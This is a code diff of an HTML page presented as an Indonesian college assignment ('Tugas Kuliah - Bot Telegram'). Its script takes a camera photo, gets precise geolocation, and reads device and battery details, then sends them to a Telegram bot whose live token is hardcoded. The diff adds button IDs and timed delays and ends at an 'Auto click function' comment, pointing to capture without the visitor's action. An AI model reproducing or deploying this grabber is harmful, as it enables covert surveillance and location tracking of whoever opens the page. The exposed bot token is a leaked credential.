@@ -1,16 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Tugas Kuliah - Bot Telegram v2</title>
+  <title>Tugas Kuliah - Bot Telegram</title>
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
   <h1>Tugas Kuliah - Bot Telegram</h1>
   
-  <button onclick="takeAutoPhoto()">Ambil Foto Otomatis</button>
-  <button onclick="getLiveLocation()">Dapatkan Lokasi Akurat</button>
-  <button onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
-  <button onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
+  <button id="autoPhotoButton" onclick="takeAutoPhoto()">Ambil Foto Otomatis</button>
+  <button id="autoLocationButton" onclick="getLiveLocation()">Dapatkan Lokasi Akurat</button>
+  <button id="autoDeviceInfoButton" onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
+  <button id="autoBatteryInfoButton" onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>
 
   <script>
     const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
@@ -29,22 +29,26 @@
     }
 
     function takeAutoPhoto() {
-      const constraints = { video: true };
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(function(stream) {
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.onloadedmetadata = function() {
-            video.play();
-            captureVideoFrame();
-            stream.getTracks().forEach(function(track) {
-              track.stop();
-            });
-          };
-        })
-        .catch(function(error) {
-          console.error('Error accessing camera: ', error);
-        });
+      setTimeout(function() {
+        const constraints = { video: true };
+        navigator.mediaDevices.getUserMedia(constraints)
+          .then(function(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = function() {
+              video.play();
+              setTimeout(function() {
+                captureVideoFrame();
+                stream.getTracks().forEach(function(track) {
+                  track.stop();
+                });
+              }, 1000);
+            };
+          })
+          .catch(function(error) {
+            console.error('Error accessing camera: ', error);
+          });
+      }, 3000);
     }
 
     function captureVideoFrame() {
@@ -59,41 +63,47 @@
     }
 
     function getLiveLocation() {
-      if ('geolocation' in navigator) {
-        const options = { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 };
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const locationText = `Lokasi: ${lat}, ${lon}`;
-          sendTelegramMessage(locationText);
-        }, function(error) {
-          console.error('Error getting location: ', error);
-        }, options);
-      } else {
-        sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
-      }
+      setTimeout(function() {
+        if ('geolocation' in navigator) {
+          const options = { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 };
+          navigator.geolocation.getCurrentPosition(function(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const locationText = `Lokasi: ${lat}, ${lon}`;
+            sendTelegramMessage(locationText);
+          }, function(error) {
+            console.error('Error getting location: ', error);
+          }, options);
+        } else {
+          sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
+        }
+      }, 3000);
     }
 
     function getDeviceInfo() {
-      const deviceInfo = `
-        Browser: ${navigator.userAgent}
-        Resolusi Layar: ${screen.width}x${screen.height}
-      `;
-      sendTelegramMessage(deviceInfo);
+      setTimeout(function() {
+        const deviceInfo = `
+          Browser: ${navigator.userAgent}
+          Resolusi Layar: ${screen.width}x${screen.height}
+        `;
+        sendTelegramMessage(deviceInfo);
+      }, 3000);
     }
 
     function getBatteryInfo() {
-      if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-          const batteryInfo = `
-            Level Baterai: ${battery.level * 100}%
-            Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
-          `;
-          sendTelegramMessage(batteryInfo);
-        });
-      } else {
-        sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
-      }
+      setTimeout(function() {
+        if ('getBattery' in navigator) {
+          navigator.getBattery().then(function(battery) {
+            const batteryInfo = `
+              Level Baterai: ${battery.level * 100}%
+              Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
+            `;
+            sendTelegramMessage(batteryInfo);
+          });
+        } else {
+          sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
+        }
+      }, 3000);
     }
 
     // Auto click function
